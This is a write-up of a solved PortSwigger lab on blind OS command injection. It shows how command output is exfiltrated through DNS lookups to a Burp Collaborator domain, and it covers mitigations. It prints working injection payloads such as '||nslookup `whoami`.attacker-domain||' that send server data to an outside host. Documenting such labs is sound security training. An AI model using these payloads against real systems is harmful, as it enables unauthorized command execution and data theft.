# Blind OS command injection with out-of-band data exfiltration

## PortSwigger Web Security Academy

Difficulty:

Practitioner

Status:

Solved


## Lab Description

This lab contains a blind OS command injection vulnerability in the feedback function.

The application executes a shell command containing user-controlled input.

However:

- The command runs asynchronously
- The output is not returned in the HTTP response
- Output redirection is not possible
- No direct communication channel exists between the server and attacker

The vulnerability is exploited using an out-of-band technique to exfiltrate command output through DNS queries.


## Vulnerability Type

Blind OS Command Injection

Technique:

Out-of-Band Data Exfiltration


This technique allows an attacker to extract command output through an external interaction when the application does not return any visible response.


## Vulnerable Functionality

Feature tested:

Feedback submission form


The vulnerable parameter was:

```
email
```


The application inserted this user-controlled value into a server-side command without proper validation.


## Exploitation


### Step 1 - Generate Burp Collaborator payload

Using Burp Collaborator:

- Generate a unique Collaborator domain
- Copy the generated payload


Example:

```
BURP-COLLABORATOR-SUBDOMAIN
```


### Step 2 - Inject command and exfiltrate output

The vulnerable parameter was modified with:


```
email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```


Example:

```
email=||nslookup+`whoami`.abc123.burpcollaborator.net||
```


## Payload Explanation


Payload:

```
||nslookup+`whoami`.attacker-domain||
```


Breakdown:


```
||
```

Command injection operator that allows execution of additional shell commands.


```
whoami
```

Command executed on the target server.

It returns the current operating system user.


```
`whoami`
```

Command substitution.

The output of `whoami` is inserted into the DNS hostname.


Example:

Command:

```
whoami
```

Output:

```
carlos
```


The executed DNS lookup becomes:

```
nslookup carlos.attacker-domain.com
```


The server sends a DNS request containing the extracted information.


## Data Exfiltration Process


Attack flow:


```
Attacker
   |
   |
Burp Collaborator domain
   |
   |
Injected command
   |
   |
Target server executes:
whoami
   |
   |
Command output inserted into DNS request
   |
   |
DNS query received by attacker
```


## Result


Burp Collaborator received a DNS interaction containing the command output.


The extracted value was:

```
[current server username]
```


This confirmed:

- Arbitrary command execution
- Ability to execute commands asynchronously
- Ability to extract information through an external channel


## Difference From Previous OOB Lab


Previous lab:

```
nslookup attacker-domain
```

Purpose:

Confirm that command execution is possible.


Current lab:

```
nslookup `whoami`.attacker-domain
```

Purpose:

Confirm execution and extract command output.


## Technical Explanation


The vulnerable application effectively executed:


```
command user_input
```


Injected input:


```
||nslookup `whoami`.attacker-domain||
```


The shell performs:


1. Execute the injected command
2. Capture the output of `whoami`
3. Insert the result into a DNS request
4. Send the query to the attacker-controlled domain


The attacker receives the data without needing access to the HTTP response.


## Real-World Applications


OOB data exfiltration is commonly used in:

- Blind command injection
- Blind SQL injection
- SSRF exploitation
- XXE attacks
- Internal network testing


## Impact


Successful exploitation may allow:

- Remote command execution
- Sensitive data theft
- Credential discovery
- Internal reconnaissance
- Server compromise


## Mitigation


Prevent OS command injection by:

- Avoiding shell execution
- Using secure APIs
- Validating all user input
- Restricting outbound DNS/HTTP traffic
- Applying least privilege principles


## Tools Used

- Burp Suite Professional
- Burp Collaborator
- Burp Repeater


## Skills Demonstrated

- Blind command injection
- OOB exploitation
- DNS exfiltration
- Burp Collaborator usage
- Command output extraction
- Remote code execution analysis
